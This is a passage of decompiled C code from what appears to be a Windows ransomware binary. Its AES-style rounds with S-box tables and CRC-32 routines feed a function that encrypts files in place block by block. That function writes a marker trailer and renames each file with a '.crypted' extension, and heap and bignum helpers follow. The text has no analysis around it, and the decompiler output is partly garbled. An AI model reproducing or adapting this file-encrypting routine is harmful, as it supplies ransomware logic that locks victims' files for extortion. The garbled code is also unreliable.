\xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16"); // 0x401376
        *v50 = v52;
        v49--;
        v48 += 4;
        while (v49 != 0) {
            // 0x401370
            v50 = (char *)v48;
            v51 = *v50;
            v52 = *(char *)((int32_t)v51 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
            *v50 = v52;
            v49--;
            v48 += 4;
        }
        int32_t v53 = v46 - 1; // 0x401385
        v46 = v53;
        v47++;
        if (v53 == 0) {
            // break -> 0x40138a
            break;
        }
    }
    // 0x40138a
    *v10 = *v9;
    *v9 = *v11;
    *v11 = *v12;
    *v12 = *v10;
    *v15 = *v13;
    *v13 = *v15;
    *v17 = *v16;
    *v16 = *v17;
    *v19 = *v18;
    *v18 = *v20;
    *v21 = *v19;
    *v20 = *v21;
    int32_t v54 = v5 + 224; // 0x4013eb
    int32_t v55 = 4; // 0x4013eb
    unsigned char v56 = *(char *)v54; // 0x4013f0
    int32_t result = v56; // 0x4013f0
    int32_t v57 = v54 + 1; // 0x4013f2
    int32_t v58; // 0x4011c0
    char * v59 = (char *)v58; // 0x4013f3
    *v59 = *v59 ^ v56;
    int32_t v60 = v58 + 1; // 0x4013f5
    v55--;
    int32_t v61 = result; // 0x4013f9
    v54 = v57;
    int32_t v62 = v60; // 0x4013f9
    while (v55 != 0) {
        // 0x4013f0
        v56 = *(char *)v54;
        result = v61 & -256 | (int32_t)v56;
        v57 = v54 + 1;
        v59 = (char *)v62;
        *v59 = *v59 ^ v56;
        v60 = v62 + 1;
        v55--;
        v61 = result;
        v54 = v57;
        v62 = v60;
    }
    int32_t v63 = 3; // 0x4013fb
    int32_t v64 = v63; // 0x4013fe
    while (v63 != 0) {
        // 0x4013e6
        v55 = 4;
        v56 = *(char *)v57;
        result = result & -256 | (int32_t)v56;
        v57++;
        v59 = (char *)v60;
        *v59 = *v59 ^ v56;
        v60++;
        v55--;
        v61 = result;
        v54 = v57;
        v62 = v60;
        while (v55 != 0) {
            // 0x4013f0
            v56 = *(char *)v54;
            result = v61 & -256 | (int32_t)v56;
            v57 = v54 + 1;
            v59 = (char *)v62;
            *v59 = *v59 ^ v56;
            v60 = v62 + 1;
            v55--;
            v61 = result;
            v54 = v57;
            v62 = v60;
        }
        // 0x4013fb
        v63 = v64 - 1;
        v64 = v63;
    }
    // 0x401400
    return result;
  lab_0x401330:
    // 0x401330
    goto lab_0x401335;
  lab_0x401348:
    // 0x401348
    v22--;
    v46 = 4;
    if (v22 == 0) {
        // break -> 0x401360
        goto lab_0x401360;
    }
    goto lab_0x401205;
  lab_0x401335:;
    // 0x401335
    int32_t v65; // 0x4011c0
    int32_t v66 = v65;
    int32_t v67; // 0x4011c0
    int32_t v68 = v67;
    int32_t v69; // 0x4011c0
    int32_t v70 = v69;
    char v71 = *(char *)v66; // 0x401335
    int32_t v72 = v66 + 1; // 0x401337
    char * v73 = (char *)v70; // 0x401338
    char v74 = *v73; // 0x401338
    *v73 = v74 ^ v71;
    int32_t v75 = v70 + 1; // 0x40133a
    int32_t v76 = v68 - 1; // 0x40133b
    v69 = v75;
    v67 = v76;
    v65 = v72;
    if (v76 != 0) {
        goto lab_0x401335;
    } else {
        // 0x401340
        int32_t v77; // 0x4011c0
        int32_t v78 = v77 - 1; // 0x401343
        if (v78 != 0) {
            goto lab_0x401330;
        } else {
            goto lab_0x401348;
        }
    }
}

// Address range: 0x401410 - 0x401955
// Used cryptographic patterns:
//  - CRC_32_IEEE_802_3_poly_0x04C11DB7 (32-bit, little endian)
int32_t function_401410(int32_t a1, int32_t a2) {
    struct _LARGE_INTEGER liDistanceToMove; // 0x40147e
    // 0x401410
    int32_t v1; // 0x401410
    function_411460(v1);
    int32_t * hFile = (int32_t *)a1; // 0x40142f
    int32_t lpFileSize; // bp+40, 0x401410
    GetFileSizeEx((int32_t *)*hFile, (struct _LARGE_INTEGER *)&lpFileSize);
    int32_t v2; // bp+88, 0x401410
    function_4071b0(&v2, 0, 92);
    int32_t v3; // bp+184, 0x401410
    function_4071b0(&v3, 0, 260);
    int32_t hFile2 = *hFile; // 0x40147c
    liDistanceToMove = (struct {int64_t e0;}){
        .e0 = 0
    };
    uint32_t v4; // 0x401410
    liDistanceToMove.e0 = v4 - 260;
    int32_t v5; // 0x401410
    SetFilePointerEx((int32_t *)hFile2, liDistanceToMove, (struct _LARGE_INTEGER *)(v5 - (int32_t)(v4 < 260)), 0);
    int32_t hFile3 = *hFile; // 0x401494
    int32_t v6 = hFile3; // bp-72, 0x401494
    int32_t lpBuffer; // bp+164, 0x401410
    int32_t lpNumberOfBytesRead; // bp-24, 0x401410
    ReadFile((int32_t *)hFile3, &lpBuffer, 260, &lpNumberOfBytesRead, NULL);
    int32_t v7 = &v6; // 0x4014a7
    int32_t v8; // 0x401410
    if (v8 != -0x54332326) {
        // 0x4014ad
        GetTickCount();
        int32_t v9; // bp+76, 0x401410
        function_405030(&v9, -1);
        int32_t v10; // bp+100, 0x401410
        function_405030(&v10, -1);
        function_401010();
        int128_t v11; // 0x401410
        int128_t v12 = __asm_movups_6(v11); // 0x401537
        int128_t v13; // 0x401410
        __asm_movups(v13, v12);
        int128_t v14 = __asm_xorps(v12, v12); // 0x40154b
        __asm_movlpd(0, v14);
        int32_t hFile4 = *hFile; // 0x401562
        SetFilePointerEx((int32_t *)hFile4, (struct {int64_t e0;}){.e0 = 0}, (struct _LARGE_INTEGER *)hFile2, (int32_t)&g266);
        __asm_movlpd(-1, __asm_xorps(v14, v14));
        int32_t hFile5 = *hFile; // 0x401587
        int32_t v15 = hFile5; // bp-128, 0x401587
        int32_t v16 = &v15; // 0x401587
        int32_t lpBuffer2; // bp+628, 0x401410
        ReadFile((int32_t *)hFile5, &lpBuffer2, (int32_t)&g266, &g266, (struct _OVERLAPPED *)&g266);
        int32_t v17 = v16; // 0x401599
        if (hFile2 != 0) {
            // 0x40159f
            v6 = 0;
            int32_t v18 = v16;
            int32_t v19 = hFile2; // 0x4015bb
            if (hFile2 < 0x1000) {
                // 0x4015bd
                v19 = hFile2 + 31 & -32;
                *(int32_t *)(v18 + 24) = v19;
                *(int32_t *)(v18 + 28) = v19;
            }
            int32_t * v20 = (int32_t *)(v18 + 48); // 0x4015cd
            *v20 = a2;
            int32_t v21 = v18 + 736; // 0x4015d1
            int32_t v22 = v19; // 0x4015da
            int32_t v23 = v21; // 0x4015da
            int32_t v24; // 0x401410
            int32_t v25; // 0x401410
            int32_t v26; // 0x401410
            int32_t v27; // 0x401410
            int32_t v28; // 0x401410
            int32_t v29; // 0x401410
            int32_t * v30; // 0x401410
            int32_t v31; // 0x4015ff
            int32_t v32; // 0x401619
            int32_t v33; // 0x401628
            char * v34; // 0x401646
            int32_t v35; // 0x401649
            int32_t v36; // 0x40165e
            int32_t v37; // 0x401664
            int32_t v38; // 0x40166b
            int32_t v39; // 0x401619
            unsigned char v40; // 0x4015e0
            int32_t v41; // 0x4015f3
            int32_t v42; // 0x4015f3
            int32_t v43; // 0x4015fa
            if (v19 == 0) {
                // 0x401607
                *(int32_t *)(v18 + 136) = a2;
                *(int32_t *)(v18 + 24) = v21;
                v39 = v18 + 720;
                v24 = v39;
                v29 = v39;
                v27 = a2;
            } else {
                v40 = *(char *)v23;
                v41 = *(int32_t *)(4 * (a2 / 0x1000000 ^ (int32_t)v40) + (int32_t)&CRC_32_IEEE_802_3_poly_0x04C11DB7_at_417028);
                v42 = v41 ^ 256 * a2;
                v43 = v22 - 1;
                v22 = v43;
                v23++;
                v26 = v42;
                while (v43 != 0) {
                    // 0x4015e0
                    v40 = *(char *)v23;
                    v41 = *(int32_t *)(4 * (v26 / 0x1000000 ^ (int32_t)v40) + (int32_t)&CRC_32_IEEE_802_3_poly_0x04C11DB7_at_417028);
                    v42 = v41 ^ 256 * v26;
                    v43 = v22 - 1;
                    v22 = v43;
                    v23++;
                    v26 = v42;
                }
                // 0x401607
                v30 = (int32_t *)(v18 + 24);
                v31 = *v30;
                *v20 = v42;
                *(int32_t *)(v18 + 136) = v42;
                *v30 = v21;
                v32 = v18 + 720;
                v24 = v32;
                v29 = v32;
                v27 = v42;
                if (v31 != 0) {
                    // 0x401624
                    v33 = (v31 - 1) / 16 + 1;
                    *(int32_t *)(v18 + 32) = v33;
                    v37 = v21;
                    v28 = v32;
                    v38 = v33;
                    v25 = v37;
                    v35 = 16;
                    v34 = (char *)v25;
                    *v34 = *v34 ^ *(char *)(v28 - v37 + v25);
                    v35--;
                    v25++;
                    while (v35 != 0) {
                        // 0x401640
                        v34 = (char *)v25;
                        *v34 = *v34 ^ *(char *)(v28 - v37 + v25);
                        v35--;
                        v25++;
                    }
                    // 0x40164e
                    function_4011c0();
                    v36 = *v30;
                    v37 = v36 + 16;
                    *v30 = v37;
                    v38--;
                    v28 = v36;
                    while (v38 != 0) {
                        // 0x401630
                        v25 = v37;
                        v35 = 16;
                        v34 = (char *)v25;
                        *v34 = *v34 ^ *(char *)(v28 - v37 + v25);
                        v35--;
                        v25++;
                        while (v35 != 0) {
                            // 0x401640
                            v34 = (char *)v25;
                            *v34 = *v34 ^ *(char *)(v28 - v37 + v25);
                            v35--;
                            v25++;
                        }
                        // 0x40164e
                        function_4011c0();
                        v36 = *v30;
                        v37 = v36 + 16;
                        *v30 = v37;
                        v38--;
                        v28 = v36;
                    }
                    // 0x401670
                    v24 = v32;
                    v29 = v36;
                    v27 = *v20;
                }
            }
            int32_t v44 = v27;
            int128_t v45 = __asm_movups_6(*(int128_t *)v29); // 0x401674
            *(int32_t *)(v18 - 4) = 0;
            *(int32_t *)(v18 - 8) = 0;
            *(int32_t *)(v18 - 12) = *(int32_t *)(v18 + 60);
            __asm_movups(*(int128_t *)v24, v45);
            *(int32_t *)(v18 - 16) = *(int32_t *)(v18 + 40);
            *(int32_t *)(v18 - 20) = *hFile;
            SetFilePointerEx(&g266, (struct {int64_t e0;}){.e0 = (int64_t)&g266}, (struct _LARGE_INTEGER *)&g266, (int32_t)&g266);
            *(int32_t *)(v18 - 24) = 0;
            *(int32_t *)(v18 - 28) = v18 + 56;
            int32_t v46 = v18 - 32; // 0x40169d
            *(int32_t *)v46 = *(int32_t *)(v18 + 8);
            *(int32_t *)(v18 - 36) = v18 + 716;
            *(int32_t *)(v18 - 40) = *hFile;
            WriteFile(&g266, &g266, (int32_t)&g266, &g266, (struct _OVERLAPPED *)&g266);
            int32_t v47 = *(int32_t *)(v18 + 104); // 0x4016b1
            *(int32_t *)(v18 - 44) = 0;
            int32_t * v48 = (int32_t *)(v18 + 12); // 0x4016c6
            *(int32_t *)(v18 - 48) = 0;
            uint32_t v49 = 0x8088405 * *v48 + 1; // 0x4016d2
            *v48 = v49;
            uint32_t v50 = v49 % (v47 == 0 ? 1 : v47);
            int32_t * v51 = (int32_t *)(v18 + 16); // 0x4016d9
            int32_t * v52 = (int32_t *)(v18 + 4); // 0x4016e4
            uint32_t v53 = *v52; // 0x4016e4
            uint32_t v54 = v50 + 1 + v53; // 0x4016e4
            *v52 = v54;
            int32_t v55 = *v51 + (int32_t)(v50 == -1) + (int32_t)(v54 < v53); // 0x4016e8
            *v51 = v55;
            int32_t v56 = 0x1000 * v55 | v54 / 0x100000; // 0x4016f2
            int32_t v57 = 0x1000 * v54; // 0x4016f6
            int32_t * v58 = (int32_t *)(v18 - 52); // 0x4016f9
            *v58 = v56;
            int32_t * v59 = (int32_t *)(v18 - 56); // 0x4016fa
            *v59 = v57;
            *(int32_t *)(v18 - 60) = *hFile;
            *(int32_t *)(v18 + 20) = v56;
            *(int32_t *)v18 = v57;
            SetFilePointerEx(&g266, (struct {int64_t e0;}){.e0 = (int64_t)&g266}, (struct _LARGE_INTEGER *)&g266, (int32_t)&g266);
            *(int32_t *)(v18 - 64) = 0;
            *(int32_t *)(v18 - 68) = v46;
            *(int32_t *)(v18 - 72) = 0x1000;
            *(int32_t *)(v18 - 76) = v18 + 676;
            int32_t v60 = v18 - 80; // 0x40171f
            *(int32_t *)v60 = *hFile;
            ReadFile(&g266, &g266, (int32_t)&g266, &g266, (struct _OVERLAPPED *)&g266);
            int32_t v61 = *v58; // 0x401727
            *v59 = v61;
            v17 = v60;
            while (v61 != 0) {
                int32_t v62 = v44;
                v18 = v60;
                int32_t v63 = v61;
                v19 = v63;
                if (v63 < 0x1000) {
                    // 0x4015bd
                    v19 = v63 + 31 & -32;
                    *(int32_t *)(v18 + 24) = v19;
                    *(int32_t *)(v18 + 28) = v19;
                }
                // 0x4015cb
                v20 = (int32_t *)(v18 + 48);
                *v20 = v62;
                v21 = v18 + 736;
                v22 = v19;
                v23 = v21;
                v26 = v62;
                if (v19 == 0) {
                    // 0x401607
                    *(int32_t *)(v18 + 136) = v62;
                    *(int32_t *)(v18 + 24) = v21;
                    v39 = v18 + 720;
                    v24 = v39;
                    v29 = v39;
                    v27 = v62;
                } else {
                    v40 = *(char *)v23;
                    v41 = *(int32_t *)(4 * (v26 / 0x1000000 ^ (int32_t)v40) + (int32_t)&CRC_32_IEEE_802_3_poly_0x04C11DB7_at_417028);
                    v42 = v41 ^ 256 * v26;
                    v43 = v22 - 1;
                    v22 = v43;
                    v23++;
                    v26 = v42;
                    while (v43 != 0) {
                        // 0x4015e0
                        v40 = *(char *)v23;
                        v41 = *(int32_t *)(4 * (v26 / 0x1000000 ^ (int32_t)v40) + (int32_t)&CRC_32_IEEE_802_3_poly_0x04C11DB7_at_417028);
                        v42 = v41 ^ 256 * v26;
                        v43 = v22 - 1;
                        v22 = v43;
                        v23++;
                        v26 = v42;
                    }
                    // 0x401607
                    v30 = (int32_t *)(v18 + 24);
                    v31 = *v30;
                    *v20 = v42;
                    *(int32_t *)(v18 + 136) = v42;
                    *v30 = v21;
                    v32 = v18 + 720;
                    v24 = v32;
                    v29 = v32;
                    v27 = v42;
                    if (v31 != 0) {
                        // 0x401624
                        v33 = (v31 - 1) / 16 + 1;
                        *(int32_t *)(v18 + 32) = v33;
                        v37 = v21;
                        v28 = v32;
                        v38 = v33;
                        v25 = v37;
                        v35 = 16;
                        v34 = (char *)v25;
                        *v34 = *v34 ^ *(char *)(v28 - v37 + v25);
                        v35--;
                        v25++;
                        while (v35 != 0) {
                            // 0x401640
                            v34 = (char *)v25;
                            *v34 = *v34 ^ *(char *)(v28 - v37 + v25);
                            v35--;
                            v25++;
                        }
                        // 0x40164e
                        function_4011c0();
                        v36 = *v30;
                        v37 = v36 + 16;
                        *v30 = v37;
                        v38--;
                        v28 = v36;
                        while (v38 != 0) {
                            // 0x401630
                            v25 = v37;
                            v35 = 16;
                            v34 = (char *)v25;
                            *v34 = *v34 ^ *(char *)(v28 - v37 + v25);
                            v35--;
                            v25++;
                            while (v35 != 0) {
                                // 0x401640
                                v34 = (char *)v25;
                                *v34 = *v34 ^ *(char *)(v28 - v37 + v25);
                                v35--;
                                v25++;
                            }
                            // 0x40164e
                            function_4011c0();
                            v36 = *v30;
                            v37 = v36 + 16;
                            *v30 = v37;
                            v38--;
                            v28 = v36;
                        }
                        // 0x401670
                        v24 = v32;
                        v29 = v36;
                        v27 = *v20;
                    }
                }
                // 0x401674
                v44 = v27;
                v45 = __asm_movups_6(*(int128_t *)v29);
                *(int32_t *)(v18 - 4) = 0;
                *(int32_t *)(v18 - 8) = 0;
                *(int32_t *)(v18 - 12) = *(int32_t *)(v18 + 60);
                __asm_movups(*(int128_t *)v24, v45);
                *(int32_t *)(v18 - 16) = *(int32_t *)(v18 + 40);
                *(int32_t *)(v18 - 20) = *hFile;
                SetFilePointerEx(&g266, (struct {int64_t e0;}){.e0 = (int64_t)&g266}, (struct _LARGE_INTEGER *)&g266, (int32_t)&g266);
                *(int32_t *)(v18 - 24) = 0;
                *(int32_t *)(v18 - 28) = v18 + 56;
                v46 = v18 - 32;
                *(int32_t *)v46 = *(int32_t *)(v18 + 8);
                *(int32_t *)(v18 - 36) = v18 + 716;
                *(int32_t *)(v18 - 40) = *hFile;
                WriteFile(&g266, &g266, (int32_t)&g266, &g266, (struct _OVERLAPPED *)&g266);
                v47 = *(int32_t *)(v18 + 104);
                *(int32_t *)(v18 - 44) = 0;
                v48 = (int32_t *)(v18 + 12);
                *(int32_t *)(v18 - 48) = 0;
                v49 = 0x8088405 * *v48 + 1;
                *v48 = v49;
                v50 = v49 % (v47 == 0 ? 1 : v47);
                v51 = (int32_t *)(v18 + 16);
                v52 = (int32_t *)(v18 + 4);
                v53 = *v52;
                v54 = v50 + 1 + v53;
                *v52 = v54;
                v55 = *v51 + (int32_t)(v50 == -1) + (int32_t)(v54 < v53);
                *v51 = v55;
                v56 = 0x1000 * v55 | v54 / 0x100000;
                v57 = 0x1000 * v54;
                v58 = (int32_t *)(v18 - 52);
                *v58 = v56;
                v59 = (int32_t *)(v18 - 56);
                *v59 = v57;
                *(int32_t *)(v18 - 60) = *hFile;
                *(int32_t *)(v18 + 20) = v56;
                *(int32_t *)v18 = v57;
                SetFilePointerEx(&g266, (struct {int64_t e0;}){.e0 = (int64_t)&g266}, (struct _LARGE_INTEGER *)&g266, (int32_t)&g266);
                *(int32_t *)(v18 - 64) = 0;
                *(int32_t *)(v18 - 68) = v46;
                *(int32_t *)(v18 - 72) = 0x1000;
                *(int32_t *)(v18 - 76) = v18 + 676;
                v60 = v18 - 80;
                *(int32_t *)v60 = *hFile;
                ReadFile(&g266, &g266, (int32_t)&g266, &g266, (struct _OVERLAPPED *)&g266);
                v61 = *v58;
                *v59 = v61;
                v17 = v60;
            }
        }
        int32_t v64 = v17;
        int32_t v65 = v64 - 4; // 0x401737
        int32_t * v66 = (int32_t *)v65; // 0x401737
        *v66 = 260;
        int32_t * v67 = (int32_t *)(v64 - 8); // 0x401743
        *v67 = 0;
        int32_t * v68 = (int32_t *)(v64 - 12); // 0x401745
        *v68 = v64 + 216;
        function_4071b0(&g266, (int32_t)&g266, (int32_t)&g266);
        *(int32_t *)(v64 + 472) = -0x54332326;
        *v66 = 4;
        *v67 = 8;
        *v68 = (int32_t)GetProcessHeap();
        int32_t * v69 = HeapAlloc(&g266, (int32_t)&g266, (int32_t)&g266); // 0x40176c
        *(int32_t *)(v64 - 16) = 4;
        *(int32_t *)(v64 - 20) = 8;
        *(int32_t *)(v64 + 28) = (int32_t)v69;
        *(int32_t *)(v64 - 24) = (int32_t)GetProcessHeap();
        int32_t * v70 = HeapAlloc(&g266, (int32_t)&g266, (int32_t)&g266); // 0x401779
        *(int32_t *)(v64 - 28) = 4;
        *(int32_t *)(v64 - 32) = 8;
        *(int32_t *)(v64 + 8) = (int32_t)v70;
        int32_t * v71 = (int32_t *)(v64 + 56); // 0x401783
        *v71 = 1;
        int32_t * v72 = (int32_t *)(v64 + 60); // 0x40178b
        *v72 = 0;
        *(int32_t *)(v64 - 36) = (int32_t)GetProcessHeap();
        int32_t * v73 = HeapAlloc(&g266, (int32_t)&g266, (int32_t)&g266); // 0x401796
        *(int32_t *)(v64 - 40) = 4;
        *(int32_t *)(v64 - 44) = 8;
        int32_t * v74 = (int32_t *)(v64 + 52); // 0x40179c
        *v74 = (int32_t)v73;
        *v71 = 1;
        *v72 = 0;
        *(int32_t *)(v64 - 48) = (int32_t)GetProcessHeap();
        int32_t * v75 = HeapAlloc(&g266, (int32_t)&g266, (int32_t)&g266); // 0x4017b3
        *(int32_t *)(v64 - 52) = (int32_t)&g144;
        *v74 = (int32_t)v75;
        int32_t v76 = v64 + 32; // 0x4017c1
        function_4041b0((int32_t)&g266);
        int128_t v77 = __asm_movaps(*(int128_t *)v76); // 0x4017ca
        int32_t v78 = *v74; // 0x4017cf
        int32_t v79 = v64 - 72; // 0x4017d3
        *(int32_t *)v79 = v76;
        int32_t v80 = v64 + 48; // 0x4017d6
        *(int32_t *)v80 = 1;
        int32_t v81 = v64 - 76; // 0x4017de
        int32_t * v82 = (int32_t *)v81; // 0x4017de
        *v82 = v76;
        *(int32_t *)v78 = 0x10001;
        __asm_movups(*(int128_t *)v79, v77);
        __asm_movq_3(*(int64_t *)(v64 - 56), __asm_movq(*(int64_t *)v80));
        int32_t * v83 = (int32_t *)(v64 - 80); // 0x4017fa
        *v83 = v64 + 72;
        *(int32_t *)(v64 - 84) = v64 + 168;
        function_405240((int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        int128_t v84 = __asm_psrldq(__asm_movaps(*(int128_t *)v65), 8); // 0x40180d
        *(int32_t *)(v64 - 88) = __asm_movd_7(v84);
        *(int32_t *)(v64 - 92) = 0;
        int32_t * v85 = GetProcessHeap(); // 0x401819
        int32_t * v86 = (int32_t *)(v64 - 96); // 0x401825
        *v86 = (int32_t)v85;
        HeapFree(&g266, (int32_t)&g266, &g266);
        int32_t v87 = v64 - 100; // 0x401828
        int32_t * v88 = (int32_t *)v87; // 0x401828
        *v88 = v78;
        *(int32_t *)(v64 - 104) = 0;
        *(int32_t *)(v64 - 108) = (int32_t)GetProcessHeap();
        HeapFree(&g266, (int32_t)&g266, &g266);
        *(int32_t *)(v64 - 112) = *v82;
        *(int32_t *)(v64 - 116) = 0;
        *(int32_t *)(v64 - 120) = (int32_t)GetProcessHeap();
        HeapFree(&g266, (int32_t)&g266, &g266);
        *(int32_t *)(v64 - 124) = *v83;
        *(int32_t *)(v64 - 128) = 0;
        *(int32_t *)(v64 - 132) = (int32_t)GetProcessHeap();
        HeapFree(&g266, (int32_t)&g266, &g266);
        int128_t v89 = __asm_xorps(v84, v84); // 0x40184f
        *(int32_t *)(v64 - 136) = 2;
        *(int32_t *)(v64 - 140) = 0;
        __asm_movlpd(*(int64_t *)v87, v89);
        *(int32_t *)(v64 - 144) = *v86;
        *(int32_t *)(v64 - 148) = *v88;
        *(int32_t *)(v64 - 152) = *hFile;
        SetFilePointerEx(&g266, (struct {int64_t e0;}){.e0 = (int64_t)&g266}, (struct _LARGE_INTEGER *)&g266, (int32_t)&g266);
        *(int32_t *)(v64 - 156) = 0;
        *(int32_t *)(v64 - 160) = v81;
        *(int32_t *)(v64 - 164) = 260;
        *(int32_t *)(v64 - 168) = v64 + 64;
        v7 = v64 - 172;
        *(int32_t *)v7 = *hFile;
        WriteFile(&g266, &g266, (int32_t)&g266, &g266, (struct _OVERLAPPED *)&g266);
        *(char *)(v64 - 149) = 1;
    }
    int32_t v90 = v7;
    int32_t v91 = v90 - 4; // 0x40188d
    *(int32_t *)v91 = *hFile;
    CloseHandle(&g266);
    int32_t v92 = v91; // 0x40189a
    if (*(char *)(v90 + 19) != 0) {
        // 0x40189c
        *(int32_t *)(v90 - 8) = (int32_t)L".crypted";
        *(int32_t *)(v90 - 12) = 0;
        int32_t v93 = a1 + 4; // 0x4018a3
        *(int32_t *)(v90 - 16) = v93;
        StrRStrIW((int16_t *)&g266, (int16_t *)&g266, (int16_t *)&g266);
        *(int32_t *)(v90 - 20) = v93;
        *(int32_t *)(v90 - 24) = v90 + 0x12d0;
        lstrcpyW((int16_t *)&g266, (int16_t *)&g266);
        *(int32_t *)(v90 - 28) = (int32_t)L".crypted";
        *(int32_t *)(v90 - 32) = v90 + 0x12c8;
        lstrcatW((int16_t *)&g266, (int16_t *)&g266);
        *(int32_t *)(v90 - 36) = v90 + 0x12c0;
        v92 = v90 - 40;
        *(int32_t *)v92 = v93;
        MoveFileW((int16_t *)&g266, (int16_t *)&g266);
    }
    int32_t * v94 = (int32_t *)(v92 - 4); // 0x4018e1
    *v94 = 0x10004;
    int32_t * v95 = (int32_t *)(v92 - 8); // 0x4018e6
    *v95 = a1;
    function_405b5b((int32_t)&g266);
    *v94 = 1;
    *v95 = (int32_t)&g239;
    InterlockedExchangeAdd(&g266, (int32_t)&g266);
    int32_t v96 = v92 + 728; // 0x401908
    int32_t v97 = 0x1000; // 0x401908
    *(char *)v96 = 0;
    v97--;
    v96++;
    while (v97 != 0) {
        // 0x401910
        *(char *)v96 = 0;
        v97--;
        v96++;
    }
    int32_t v98 = v92 + 112; // 0x401920
    int32_t v99 = 92; // 0x401920
    *(char *)v98 = 0;
    v99--;
    v98++;
    while (v99 != 0) {
        // 0x401924
        *(char *)v98 = 0;
        v99--;
        v98++;
    }
    int32_t v100 = v92 + 208; // 0x40193b
    int32_t v101 = 260; // 0x40193b
    *(char *)v100 = 0;
    v101--;
    v100++;
    while (v101 != 0) {
        // 0x401940
        *(char *)v100 = 0;
        v101--;
        v100++;
    }
    // 0x40194b
    return 0;
}

// Address range: 0x401960 - 0x40198a
int32_t function_401960(void) {
    // 0x401960
    if (g239 >= g238) {
        // 0x401989
        return g238;
    }
    // 0x40196d
    int32_t v1; // bp-4, 0x401960
    int32_t v2 = &v1; // 0x40196e
    v2 -= 4;
    *(int32_t *)v2 = 0x1388;
    Sleep((int32_t)&g266);
    while (g239 < g238) {
        // 0x401974
        v2 -= 4;
        *(int32_t *)v2 = 0x1388;
        Sleep((int32_t)&g266);
    }
    // 0x401989
    return g238;
}

// Address range: 0x401990 - 0x4019a7
int32_t function_401990(int32_t a1) {
    int32_t * v1 = HeapAlloc(GetProcessHeap(), (int32_t)&g266, (int32_t)&g266); // 0x40199f
    return (int32_t)v1;
}

// Address range: 0x4019b0 - 0x4019ca
int32_t function_4019b0(int32_t a1, int32_t a2) {
    int32_t * v1 = HeapReAlloc(GetProcessHeap(), (int32_t)&g266, &g266, (int32_t)&g266); // 0x4019c2
    return (int32_t)v1;
}

// Address range: 0x4019d0 - 0x4019e7
int32_t function_4019d0(int32_t a1) {
    // 0x4019d0
    return HeapFree(GetProcessHeap(), (int32_t)&g266, &g266);
}

// Address range: 0x4019f0 - 0x401a87
int32_t function_4019f0(uint32_t a1, int32_t a2, uint32_t a3) {
    int32_t result = 0; // 0x401a08
    int32_t v1; // 0x4019f0
    int32_t v2; // 0x4019f0
    if (a3 >= 1) {
        int32_t v3 = a3; // 0x401a1b
        int32_t v4 = 0; // 0x401a1b
        int32_t v5 = a2; // 0x401a1b
        uint32_t v6 = *(int32_t *)(v1 - a2 + v5); // 0x401a25
        uint32_t v7 = *(int32_t *)v5 + v4; // 0x401a29
        v4 = (int32_t)(v7 < v4) + (int32_t)(v6 < v7);
        v3--;
        *(int32_t *)(v2 - a2 + v5) = v6 - v7;
        v5 += 4;
        result = v4;
        while (v3 != 0) {
            // 0x401a20
            v6 = *(int32_t *)(v1 - a2 + v5);
            v7 = *(int32_t *)v5 + v4;
            v4 = (int32_t)(v7 < v4) + (int32_t)(v6 < v7);
            v3--;
            *(int32_t *)(v2 - a2 + v5) = v6 - v7;
            v5 += 4;
            result = v4;
        }
    }
    // 0x401a51
    if (a1 <= a3) {
        // 0x401a80
        return result;
    }
    int32_t result2 = result; // 0x401a62
    int32_t v8 = v2 + 4 * a3; // 0x401a62
    int32_t v9 = 0; // 0x401a62
    uint32_t v10 = *(int32_t *)(v1 - v2 + v8); // 0x401a65
    *(int32_t *)v8 = v10 - result2;
    v9++;
    result2 = v10 < result2;
    v8 += 4;
    while (v9 < a1 - a3) {
        // 0x401a65
        v10 = *(int32_t *)(v1 - v2 + v8);
        *(int32_t *)v8 = v10 - result2;
        v9++;
        result2 = v10 < result2;
        v8 += 4;
    }
    // 0x401a80
    return result2;
}

// Address range: 0x401a90 - 0x401b27
int32_t function_401a90(int32_t a1, uint32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    int32_t v1 = a2 & 0xffff; // 0x401a9b
    uint32_t v2 = a2 / 0x10000; // 0x401a9e
    int32_t result = 0; // 0x401aaf
    int32_t v3 = a1; // 0x401aaf
    int32_t v4; // 0x401a90
    uint32_t v5 = *(int32_t *)v4; // 0x401ab2
